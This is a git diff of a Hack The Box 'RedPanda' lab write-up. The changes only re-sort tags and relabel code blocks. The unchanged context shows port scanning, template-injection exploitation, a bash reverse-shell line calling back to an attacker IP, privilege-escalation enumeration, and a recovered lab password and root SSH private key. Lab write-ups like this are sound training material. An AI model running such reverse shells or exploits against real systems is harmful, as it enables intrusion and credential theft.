@@ -1,7 +1,7 @@
 # 📦 RedPanda
 
 Tags: #📦
-Related to: [[nmap]], [[whatweb]], [[python]], [[wget]], [[peass]], [[pspy]], [[gobuster]], [[curl]], [[exiftool]]
+Related to: [[curl]], [[exiftool]], [[gobuster]], [[nmap]], [[peass]], [[pspy]], [[python]], [[wget]], [[whatweb]]
 See also:
 Previous: [[HTB]]
 
@@ -9,7 +9,7 @@ Previous: [[HTB]]
 
 ## Linux
 
-```shell-session
+```text
 10.10.11.170
 ```
 
@@ -19,7 +19,7 @@ Previous: [[HTB]]
 
 	nmap 10.10.11.170
 
-```shell-session
+```text
 PORT     STATE SERVICE
 22/tcp   open  ssh
 8080/tcp open  http-proxy
@@ -35,7 +35,7 @@ PORT     STATE SERVICE
 
 	whatweb 10.10.11.170:8080
 
-```shell-session
+```text
 Title[Red Panda Search | Made with Spring Boot]
 ```
 
@@ -75,7 +75,7 @@ Malicious input injected into template to execute commands on the server-side.
 
 	python3 exploit.py
 
-```shell-session
+```text
 $ id
 uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
 
@@ -89,7 +89,7 @@ $ cat /home/woodenk/user.txt
 
 	cat shell.sh
 
-```shell-session
+```text
 bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'
 ```
 
@@ -121,7 +121,7 @@ Victim:
 	chmod +x linpeas.sh
 	./linpeas.sh
 
-```shell-session
+```text
 <...SNIP...>
 ╔══════════╣ Sudo version
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
@@ -287,7 +287,7 @@ Found stored credentials:
 
 	ssh woodenk@10.10.11.170
 
-```shell-session
+```text
 woodenk@10.10.11.170's password: RedPandazRule
 woodenk@redpanda:~$
 ```
@@ -306,7 +306,7 @@ Victim:
 
 root runs `cleanup.sh` as woodenk:
 
-```shell-session
+```text
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
     ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
@@ -342,7 +342,7 @@ Study the source code or the website in whichever order you choose.
 
 	gobuster dir -u http://10.10.11.170:8080/ -w /usr/share/dirb/wordlists/common.txt 
 
-```shell-session
+```text
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -595,7 +595,7 @@ public class App {
 	wget http://10.10.11.170:8080/img/greg.jpg
 	exiftool greg.jpg
 
-```shell-session
+```text
 ExifTool Version Number         : 12.44
 File Name                       : greg.jpg
 Directory                       : .
@@ -615,7 +615,7 @@ Artist                          : woodenk
 
 	exiftool greg.jpg
 
-```shell-session
+```text
 ExifTool Version Number         : 12.44
 File Name                       : greg.jpg
 Directory                       : .
@@ -677,7 +677,7 @@ After a few moments...
 
 	cat /home/woodenk/privesc_creds.xml
 
-```shell-session
+```text
 <?xml version="1.0" encoding="UTF-8"?>
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace>
@@ -704,7 +704,7 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 
 	vi id_rsa
 
-```shell-session
+```text
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
@@ -717,14 +717,14 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 	chmod 600 id_rsa
 	ssh root@10.10.11.170 -i id_rsa
 
-```shell-session
+```text
 root@10.10.11.170
 root@redpanda:~#
 ```
 
 	cat /root/root.txt
 
-```shell-session
+```text
 <...FLAG...>
 ```
 
@@ -790,13 +790,13 @@ No changes have been made to the system and created/uploaded files have been rem
 
 #### woodenk password (MySQL, SSH, ...)
 
-```shell-session
+```text
 woodenk:RedPandazRule
 ```
 
 #### root SSH private key
 
-```shell-session
+```text
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
